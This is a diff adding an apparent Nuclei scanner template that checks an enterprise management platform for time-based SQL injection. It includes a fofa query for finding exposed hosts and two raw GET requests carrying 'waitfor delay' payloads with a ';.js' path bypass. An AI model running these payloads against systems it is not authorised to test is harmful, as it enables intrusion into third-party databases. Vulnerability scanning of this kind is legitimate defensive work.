@@ -1,0 +1,35 @@
+id: FE-ajax_codewidget39-sql-injection
+
+info:
+  name: 飞企互联-FE企业运营管理平台 ajax_codewidget39 SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="飞企互联-FE企业运营管理平台"
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:3%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=3 && duration_1<=4'  
+          - 'duration_2>=6 && duration_2<=7'
+        condition: and    
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
